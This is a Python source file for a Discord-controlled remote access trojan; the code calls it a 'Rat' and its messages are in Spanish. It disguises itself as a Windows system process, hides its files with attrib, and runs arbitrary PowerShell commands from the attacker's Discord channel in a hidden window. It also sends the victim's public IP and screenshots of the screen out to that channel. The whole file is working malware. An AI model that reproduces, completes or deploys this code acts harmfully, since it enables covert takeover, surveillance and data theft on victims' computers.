import os
import subprocess
import discord
import pyautogui
import requests
from discord.ext import commands
import sys
import secret
import shutil
import time


intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(command_prefix="%", intents=intents)


NUEVO_NOMBRE = "Proceso de host para tareas de Windows.exe"

ruta_actual = sys.executable
carpeta = os.path.dirname(ruta_actual)
nueva_ruta = os.path.join(carpeta, NUEVO_NOMBRE)

if os.path.basename(ruta_actual) != NUEVO_NOMBRE:
    if not os.path.exists(nueva_ruta):
        shutil.copy2(ruta_actual, nueva_ruta)
    
    os.system(f'attrib +h +s "{ruta_actual}"')
    os.system(f'attrib +h +s "{nueva_ruta}"')
    

    time.sleep(0.5)
    
    subprocess.Popen([nueva_ruta])
    sys.exit()

os.system(f'attrib +h +s "{ruta_actual}"')


def ejecutar_comando_oculto(comando: str):
    argumentos = [
        "powershell",
        "-NoLogo",
        "-NoProfile",
        "-WindowStyle",
        "Hidden",
        "-Command",
        comando,
    ]

    if os.name == "nt":
        return subprocess.run(
            argumentos,
            capture_output=True,
            text=True,
            timeout=60,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    


@bot.event 
async def on_ready():
    print(f"Rat is ready como {bot.user}")


@bot.command()
async def cmd(ctx, *, comando: str):
    if not comando.strip():
        await ctx.send("Debes escribir un comando después de `%cmd`.")
        return

    typing_ctx = getattr(ctx, "typing", None) or getattr(ctx.channel, "typing", None)

    try:
        if typing_ctx:
            async with typing_ctx():
                resultado = ejecutar_comando_oculto(comando)
        else:
            resultado = ejecutar_comando_oculto(comando)

        if resultado.stdout:
            texto_completo = resultado.stdout.strip()
            while texto_completo:
                fragmento = texto_completo[:1900]
                await ctx.send(f"```\n{fragmento}\n```")
                texto_completo = texto_completo[1900:]
            return

        if resultado.stderr:
            error = resultado.stderr.strip()
            await ctx.send(f"Error en la consola:\n```\n{error[:1900]}\n```")
            return

        await ctx.send(f"Comando ejecutado: `{comando}`")

    except subprocess.TimeoutExpired:
        await ctx.send("El comando tardó demasiado y fue detenido.")
    except Exception as e:
        await ctx.send(f"Error del Bot: {e}")


@bot.command()
async def ip(ctx):
    #Crea un canal de texto con la IP pública del host
    try:
        ip = requests.get("https://api.ipify.org", timeout=10).text
        await ctx.guild.create_text_channel(f"ip-{ip.replace('.', '-')}")
    except Exception as e:
        await ctx.send(f"No se pudo obtener la IP: {e}")


@bot.command()
async def screenshot(ctx):
    #Toma una captura de pantalla y la envía al canal.
    try:
        path = "screen.png"
        pyautogui.screenshot(path)
        await ctx.send(file=discord.File(path))
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        await ctx.send(f"No se pudo tomar la captura: {e}")


bot.run(secret.TOKEN)
